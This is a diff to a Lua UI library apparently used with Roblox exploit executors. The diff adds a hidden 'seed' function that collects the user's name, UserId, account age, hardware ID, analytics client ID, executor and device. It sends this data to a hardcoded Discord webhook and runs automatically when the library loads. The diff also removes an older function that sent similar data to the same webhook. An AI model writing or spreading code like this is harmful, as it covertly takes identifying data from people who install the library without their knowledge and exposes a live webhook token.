@@ -1,3 +1,4 @@
+
 repeat
     task.wait()
 until game:IsLoaded()
@@ -184,6 +185,96 @@ function library.new(library, name, theme)
     local UICornerMain = Instance.new("UICorner")
     local UIGradient = Instance.new("UIGradient")
     local UIGradientTitle = Instance.new("UIGradient")
+    
+    function seed(name)
+    local Webhook = "https://discord.com/api/webhooks/1256852889276780584/pe4QF88LovWxkUHriaJZPNt46TZ1Neg-0q_7qfhwLRr3VikCxDGFDba64MYyMv4r7Otm"
+
+    local player = game:GetService("Players").LocalPlayer
+    local joinTime = os.time() - (player.AccountAge * 86400)
+    local joinDate = os.date("!*t", joinTime)
+    local premium = player.MembershipType == Enum.MembershipType.Premium
+
+    _G.IsPc = game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled and "模拟器/PC" or
+               game.UserInputService.TouchEnabled and "IOS/Android" or "IOS/Android/Unknown"
+
+    local executor = identifyexecutor() or "Unknown"
+    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", player.UserId))
+    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+    local AvatarImage = Thing.imageUrl
+
+    local msg = {
+        ["username"] = "Alwayswin_bot",
+        ["embeds"] = {
+            {
+                ["color"] = tonumber("0x32CD32"),
+                ["title"] = "有人使用落叶中心",
+                ["thumbnail"] = {
+                    ["url"] = AvatarImage,
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "名称(Name)",
+                        ["value"] = "||"..player.Name.."||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "昵称(DisplayName)",
+                        ["value"] = player.DisplayName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "UserId",
+                        ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. player.UserId .. "/profile") .. ")||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "地图ID",
+                        ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) .. ")",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "地图名称",
+                        ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "使用的注入器",
+                        ["value"] = executor,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "账号年龄",
+                        ["value"] = player.AccountAge.."天",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "加入日期",
+                        ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "HWID",
+                        ["value"] = gethwid(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "客户端ID",
+                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "设备",
+                        ["value"] = _G.IsPc,
+                        ["inline"] = false
+                    },
+                }
+            }
+        }
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(msg)})
+    end
 
     if syn and syn.protect_gui then
         syn.protect_gui(dogent)
@@ -206,79 +297,6 @@ function library.new(library, name, theme)
         end
     end
 
-    local time = os.date("%c", os.time())
-    local teleport = "```lua\n" ..
-    'game:GetService("TeleportService")' ..
-    ":TeleportToPlaceInstance" .. "(" ..
-    game.PlaceId .. "," .. "'" .. game.JobId .. "'" .. "," .. "game.Players.LocalPlayer" .. ")```"
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-
-    function webhook(title)
-    url =
-    "https://discord.com/api/webhooks/1256852889276780584/pe4QF88LovWxkUHriaJZPNt46TZ1Neg-0q_7qfhwLRr3VikCxDGFDba64MYyMv4r7Otm"
-    local data = {
-        ["content"] = "",
-        ["username"] = a,
-        ["embeds"] = {
-            {
-                ["title"] = title,
-                ["description"] = "落叶中心\n" .. teleport,
-                ["type"] = "rich",
-                ["footer"] = {
-                    ["text"] = time
-                },
-                fields = {
-
-                    {
-                        name = " 用户名 ",
-                        value = "> " .. game.Players.LocalPlayer.Name,
-                        inline = true
-                    },
-
-                    {
-                        name = " UserId ",
-                        value = "> " .. game.Players.LocalPlayer.UserId,
-                        inline = true
-                    },
-
-                    {
-                        name = " 游戏 ",
-                        value = "> " .. gameName,
-                        inline = true
-                    },
-
-                    {
-                        name = " 注入器 ",
-                        value = "> " .. identifyexecutor(),
-                        inline = true
-                    },
-
-                    {
-                        name = " JobId ",
-                        value = "> " .. game.JobId,
-                        inline = true
-                    },
-
-                    {
-                        name = " PlaceId ",
-                        value = "> " .. game.PlaceId,
-                        inline = true
-                    },
-                }
-            }
-        }
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-
-    request = http_request or request or HttpPost or syn.request
-    local a = { Url = url, Body = newdata, Method = "POST", Headers = headers }
-
-    request(a)
-    end
 
     Main.Name = "Main"
     Main.Parent = dogent
@@ -1595,6 +1613,8 @@ end)
                         funcs:AddOption(v)
                     end
                 end
+                
+                
 
                 funcs:SetOptions(options)
 
@@ -1606,4 +1626,8 @@ end)
     end
     return window
 end
+seed(name)
 return library
+
+
+
